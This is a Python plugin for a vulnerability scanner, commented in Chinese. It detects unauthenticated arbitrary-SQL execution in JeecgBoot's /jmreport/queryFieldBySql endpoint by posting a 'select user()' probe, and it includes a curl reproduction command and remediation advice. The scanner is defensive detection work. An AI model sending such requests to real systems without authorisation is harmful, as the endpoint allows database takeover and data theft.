# JeecgBoot 报表 SQL 注入：/jmreport/queryFieldBySql 自定义 SQL 执行（未授权 RCE 前置）
# 存在性验证：提交只读探针 select user()，响应回显 user@host 或含 SQL 报错特征即确认
import json
import re

from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from core.http import join_url
from lib.colors import no, ok
from lib.matcher import match_sql_error, parse_json_body
from lib.reporter import emit
from plugins.base import PluginBase


def _has_sql_result_echo(resp):
    """判定响应体中的 SQL 字段是否回显了 select user() 的执行结果（正向证据）

    关键约束：证据必须位于 JSON 的 `result` 键内，而非任意文本。
    这样任意 HTML 页面（如含"当前版本 4.7.8"）都不可能命中——它们没有 result 字段。
    仅"响应含通用键 code/result"不算证据；必须是 result 内出现 SQL 函数返回值：
      - user() 形态：user@host（如 root@localhost）
      - @@version 数字形态：如 5.7.34 / 8.0.32（含可选 -log/-debug 后缀）
      - database() 返回值：短裸标识符（合法库名）
    """
    body = parse_json_body(resp)
    if not isinstance(body, dict) or "result" not in body:
        return False
    result = body.get("result")
    # result 可能是字符串、list（多行结果）或 dict；统一转成文本再匹配
    result_text = result if isinstance(result, str) else json.dumps(result, ensure_ascii=False)

    # user() 回显：user@host（要求 host 段非数字，避免误匹配邮件/路径片段）
    if re.search(r"\b[a-zA-Z_][a-zA-Z0-9_.-]*@[a-zA-Z][a-zA-Z0-9_.-]*\b", result_text):
        return True
    # @@version 数字形态：x.y.z（版本号特征，需在 result 内）
    if re.search(r"(?<![\w.])\d+\.\d+\.\d+(-log|-debug)?(?![\w.])", result_text):
        return True
    # database() 返回值：result 为合法库名（字母/下划线起头，不含空格与标点）
    if isinstance(result, str) and re.fullmatch(r"[a-zA-Z_][a-zA-Z0-9_]{0,63}", result.strip()):
        return True
    return False


class JeecgSqlInjectJmreportPlugin(PluginBase):
    name = "JeecgBoot jmreport SQL注入"
    cve = "CNVD-2022-30348"
    severity = "high"
    category = "vuln"
    description = "JeecgBoot 报表模块 /jmreport/queryFieldBySql 可执行任意 SQL（未授权）"
    fix = "升级 JeecgBoot 至 3.4.3+；报表接口强制鉴权"
    fix_detail = (
        "【升级方案】升级至 JeecgBoot 3.4.3+（报表模块安全修复）\n"
        "【配置加固】/jmreport/** 全部接口增加登录鉴权（sa-token 拦截器白名单移除 jmreport）\n"
        "【代码修复】JmreportController 的 SQL 执行接口增加管理员权限校验\n"
        "【WAF 规则】拦截 /jmreport/queryFieldBySql 的 POST 请求\n"
        "【合规】OWASP A03:2021 注入；等保 2.0 8.1.3"
    )
    reproduce = (
        'curl -X POST "http://target/jeecg-boot/jmreport/queryFieldBySql" \\\n'
        '  -H "Content-Type: application/json" \\\n'
        '  -d \'{"sql":"select user()","dbKey":"master"}\'\n'
        "# 预期响应：JSON 含 user 回显或 SQL 错误信息（成功执行任意 SQL）"
    )
    cvss_vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    compliance = "等保2.0:8.1.3;OWASP:A03:2021"
    vuln_type = "sqli"
    supports_waf_bypass = True

    def verify(self, target, session):
        """检测 /jmreport/queryFieldBySql 是否可未授权执行任意 SQL。

        @param target: 目标站点根 URL
        @param session: 复用的 HTTP 会话
        @return: ScanResult —— 命中 CONFIRMED；未命中 SAFE；网络异常 UNKNOWN
        """
        url = join_url(target, "/jeecg-boot/jmreport/queryFieldBySql")
        try:
            # 不带鉴权头直连：放行则执行 SQL 返回业务 JSON，被拦截则返回 401/403
            resp = session.post(
                url,
                # dbKey=master 指定默认数据源；select user() 为只读探测，不触碰业务数据
                data='{"sql":"select user()","dbKey":"master"}',
                headers={"Content-Type": "application/json"},
            )
            text = resp.text or ""
        except Exception as e:
            # 网络异常归 UNKNOWN：测不到 ≠ 安全，避免漏报
            emit(no("JeecgBoot jmreport SQL注入（网络异常）"))
            return ScanResult(kind="vuln", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))
        # 成功执行判定：必须拿到 SQL 真正被执行的证据，且排除 401/403 鉴权拦截——
        #   1) select user() 的回显结果形如 root@localhost（用户@主机）；
        #   2) 数据库报错泄漏（match_sql_error：XPATH syntax error / SQLSTATE 等）。
        # 状态码不作为唯一门槛：网关/框架常把数据库报错包装成 500 并携带错误体，
        # 历史缺陷「仅 status==200 才判定」会对这类响应直接落 SAFE（false negative）；
        # 仅明确鉴权拦截（401/403）不参与判定。
        user_host = re.search(r"[A-Za-z0-9_.\-]+@[A-Za-z0-9_.\-]+", text)
        sql_error = match_sql_error(text)
        if resp.status_code not in (401, 403) and (user_host or sql_error):
            emit(ok("存在 JeecgBoot jmreport SQL注入"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=url,
                evidence=(
                    f"HTTP {resp.status_code}；select user() 结果回显：{user_host.group(0)}"
                    if user_host
                    else f"HTTP {resp.status_code}；响应含数据库报错特征（SQL 被执行）"
                ),
                fix=self.fix,
                extra={"vuln_type": "sqli", "plugin_name": "jeecg_sqli_jmreport"},
            )
        emit(no("不存在 JeecgBoot jmreport SQL注入"))
        return ScanResult(kind="vuln", name=self.name, status=STATUS_SAFE, url=url)
